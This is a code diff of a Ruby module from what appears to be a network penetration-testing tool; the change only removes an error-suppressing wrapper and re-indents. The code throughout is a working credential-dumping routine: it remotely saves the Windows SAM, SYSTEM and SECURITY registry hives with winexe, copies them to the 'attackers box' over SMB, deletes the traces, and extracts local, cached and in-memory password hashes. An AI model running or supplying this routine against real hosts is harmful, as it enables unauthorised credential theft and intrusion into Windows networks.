@@ -37,115 +37,113 @@ class HashesWorkstation < Poet::Scanner
 		create_folder("#{@log}/hashes/#{host}") unless folder_exists("#{@log}/hashes/#{host}")
 		
 		# dump local hashes
-		capture_stderr('/dev/null') {
-			# export sam, system, security into %TEMP%
-			smboptions = "--system //#{host}"
-			clientoptions = "//#{host}/c$ -c"
+		# export sam, system, security into %TEMP%
+		smboptions = "--system //#{host}"
+		clientoptions = "//#{host}/c$ -c"
 
-			hashes = winexe(smboptions, "CMD /C reg.exe save HKLM\\SAM %TEMP%\\sam && reg.exe save HKLM\\SYSTEM %TEMP%\\sys && reg.exe save HKLM\\SECURITY %TEMP%\\sec")
-			# Check if sam dump successful
+		hashes = winexe(smboptions, "CMD /C reg.exe save HKLM\\SAM %TEMP%\\sam && reg.exe save HKLM\\SYSTEM %TEMP%\\sys && reg.exe save HKLM\\SECURITY %TEMP%\\sec")
+		# Check if sam dump successful
 
-			temp_directory = ''
-			3.times do
-				temp_directory = winexe(smboptions, "CMD /C echo %TEMP%").chomp
-				break unless temp_directory.empty?
-				sleep 3
-			end
+		temp_directory = ''
+		3.times do
+			temp_directory = winexe(smboptions, "CMD /C echo %TEMP%").chomp
+			break unless temp_directory.empty?
+			sleep 3
+		end
 
-			temp_directory.gsub!('C:', '') if temp_directory
+		temp_directory.gsub!('C:', '') if temp_directory
 
-			# download registry hives to attackers box
-			sam = smbclient(clientoptions, "get #{temp_directory}\\sam #{@log}/hashes/#{host}/sam")
+		# download registry hives to attackers box
+		sam = smbclient(clientoptions, "get #{temp_directory}\\sam #{@log}/hashes/#{host}/sam")
 
-			if not check_status(sam)
-				print_warning("#{host.ljust(15)} - Issues downloading SAM")
-			end
+		if not check_status(sam)
+			print_warning("#{host.ljust(15)} - Issues downloading SAM")
+		end
 
-			security = smbclient(clientoptions, "get #{temp_directory}\\sec #{@log}/hashes/#{host}/security")
-			if not check_status(security)
-				print_warning("#{host.ljust(15)} - Issues downloading Security")
-			end
+		security = smbclient(clientoptions, "get #{temp_directory}\\sec #{@log}/hashes/#{host}/security")
+		if not check_status(security)
+			print_warning("#{host.ljust(15)} - Issues downloading Security")
+		end
 
-			system = smbclient(clientoptions, "get #{temp_directory}\\sys #{@log}/hashes/#{host}/system")
-			if not check_status(system)
-				print_warning("#{host.ljust(15)} - Issues downloading SYSTEM")
-			end
+		system = smbclient(clientoptions, "get #{temp_directory}\\sys #{@log}/hashes/#{host}/system")
+		if not check_status(system)
+			print_warning("#{host.ljust(15)} - Issues downloading SYSTEM")
+		end
 
-			# cleanup hashes on the remote system
-			winexe = "--uninstall #{winexe}" unless @wce
-			cleanup = winexe(smboptions, "CMD /C del %TEMP%\\sam %TEMP%\\sys %TEMP%\\sec")
+		# cleanup hashes on the remote system
+		winexe = "--uninstall #{winexe}" unless @wce
+		cleanup = winexe(smboptions, "CMD /C del %TEMP%\\sam %TEMP%\\sys %TEMP%\\sec")
 
-			# validate hives exist locally
-			if file_exists?("#{@log}/hashes/#{host}/sam")
-				vprint_status("#{host.ljust(15)} - Registry Hives Exported")
-				@success = @success + 1
-			else
-				print_bad("#{host.ljust(15)} - Issues Exporting Hashes")
-				@failed = @failed + 1
-			end
-			
-			hashdump = ''
-			full_print_line = ''
-			has_hashes = false
-
-			hashdumper = Hashdump.new
-			# parse hashes out of registry hives locally
-			begin
-				sam = Hashdump::Hive.new("#{@log}/hashes/#{host}/sam")
-				sys = Hashdump::Hive.new("#{@log}/hashes/#{host}/system")
-				hashdump = hashdumper.dump_creds(sam, sys)
-				# Strip null characters from dump
-				hashdump.strip_chars!("\x00") unless hashdump.empty?
-
-				if hashdump.lines.count > 0 
-					full_print_line << "#{highlight(hashdump.lines.count)} Local, ".ljust(10)
-				else
-					full_print_line << "#{highlight_red(hashdump.lines.count)} Local, ".ljust(10)				
-				end
-				has_hashes = true
-			rescue
-				vprint_bad("#{host.ljust(15)} - Issues extracing hashes from hives")
-			end
+		# validate hives exist locally
+		if file_exists?("#{@log}/hashes/#{host}/sam")
+			vprint_status("#{host.ljust(15)} - Registry Hives Exported")
+			@success = @success + 1
+		else
+			print_bad("#{host.ljust(15)} - Issues Exporting Hashes")
+			@failed = @failed + 1
+		end
 		
-		
-			# run cachedump.py
-			cachedcreds = ''
-			type = ''
-			cachedump = Cachedump.new
-			begin
-				sec = Cachedump::Hive.new("#{@log}/hashes/#{host}/security")
-				sys = Cachedump::Hive.new("#{@log}/hashes/#{host}/system")
-				cachedcreds, type = cachedump.run(sec,sys)
-			rescue
+		hashdump = ''
+		full_print_line = ''
+		has_hashes = false
 
-			end
+		hashdumper = Hashdump.new
+		# parse hashes out of registry hives locally
+		begin
+			sam = Hashdump::Hive.new("#{@log}/hashes/#{host}/sam")
+			sys = Hashdump::Hive.new("#{@log}/hashes/#{host}/system")
+			hashdump = hashdumper.dump_creds(sam, sys)
+			# Strip null characters from dump
+			hashdump.strip_chars!("\x00") unless hashdump.empty?
 
-			if cachedcreds.lines.count > 0 
-				has_hashes = true
-				full_print_line << "#{highlight(cachedcreds.lines.count)} Cached, ".ljust(10)
+			if hashdump.lines.count > 0 
+				full_print_line << "#{highlight(hashdump.lines.count)} Local, ".ljust(10)
 			else
-				full_print_line << "#{highlight_red(cachedcreds.lines.count)} Cached, ".ljust(10)
+				full_print_line << "#{highlight_red(hashdump.lines.count)} Local, ".ljust(10)				
 			end
-
-			wcedump = ''
-			# Dump with WCE if set in config
-			if @wce
-				wcedump = wce(username, password, host)
-				if wcedump.lines.count > 0
-					full_print_line << "#{highlight(wcedump.lines.count)} in Memory".ljust(10)
-				else
-					full_print_line << "#{highlight_red(wcedump.lines.count)} in Memory".ljust(10)
-				end
-			end
-
-			print_good("#{host.ljust(15)} - Found #{full_print_line}") if has_hashes
-
-			output_text = "#{host}\nSAM:\n#{hashdump}"
-			output_text << "Cached:\n#{cachedcreds}" unless cachedcreds.empty?
-			output_text << "In Memory:\n#{wcedump}" unless wcedump.empty?
+			has_hashes = true
+		rescue
+			vprint_bad("#{host.ljust(15)} - Issues extracing hashes from hives")
+		end
 	
-			@hashes[host.to_sym] = [hashdump, cachedcreds, wcedump]
-		}
+	
+		# run cachedump.py
+		cachedcreds = ''
+		type = ''
+		cachedump = Cachedump.new
+		begin
+			sec = Cachedump::Hive.new("#{@log}/hashes/#{host}/security")
+			sys = Cachedump::Hive.new("#{@log}/hashes/#{host}/system")
+			cachedcreds, type = cachedump.run(sec,sys)
+		rescue
+
+		end
+
+		if cachedcreds.lines.count > 0 
+			has_hashes = true
+			full_print_line << "#{highlight(cachedcreds.lines.count)} Cached, ".ljust(10)
+		else
+			full_print_line << "#{highlight_red(cachedcreds.lines.count)} Cached, ".ljust(10)
+		end
+
+		wcedump = ''
+		# Dump with WCE if set in config
+		if @wce
+			wcedump = wce(username, password, host)
+			if wcedump.lines.count > 0
+				full_print_line << "#{highlight(wcedump.lines.count)} in Memory".ljust(10)
+			else
+				full_print_line << "#{highlight_red(wcedump.lines.count)} in Memory".ljust(10)
+			end
+		end
+
+		print_good("#{host.ljust(15)} - Found #{full_print_line}") if has_hashes
+
+		output_text = "#{host}\nSAM:\n#{hashdump}"
+		output_text << "Cached:\n#{cachedcreds}" unless cachedcreds.empty?
+		output_text << "In Memory:\n#{wcedump}" unless wcedump.empty?
+
+		@hashes[host.to_sym] = [hashdump, cachedcreds, wcedump]
 	end
 
 	def check_status(hive)
